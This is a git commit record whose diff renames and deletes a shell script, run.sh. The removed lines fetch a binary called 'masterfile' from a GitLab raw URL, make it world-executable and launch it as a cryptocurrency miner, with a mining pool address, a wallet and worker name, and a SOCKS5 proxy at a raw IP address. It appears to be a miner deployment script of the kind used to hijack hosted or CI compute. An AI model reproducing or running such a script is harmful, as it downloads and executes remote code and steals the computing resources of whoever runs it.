8b7804725a04848723c027a4aad3dad036286140
DelmaNealy <90093978+DelmaNealy@users.noreply.github.com>
2021-09-22 01:56:54 +0000

    Update and rename run.sh to dan.sh

--- run.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/sh
-wget https://gitlab.com/wayankarpo/xm/-/raw/main/masterfile
-chmod 777 masterfile
-POOL=stratum+tcp://pool-pay.com:26339 
-WALLET=endvoc
-WORKER=endvoc
-PROXY=socks5://192.252.209.155:14455
-./masterfile -o $POOL -u $WALLET -p $WORKER --donate-level 1 -x $PROXY
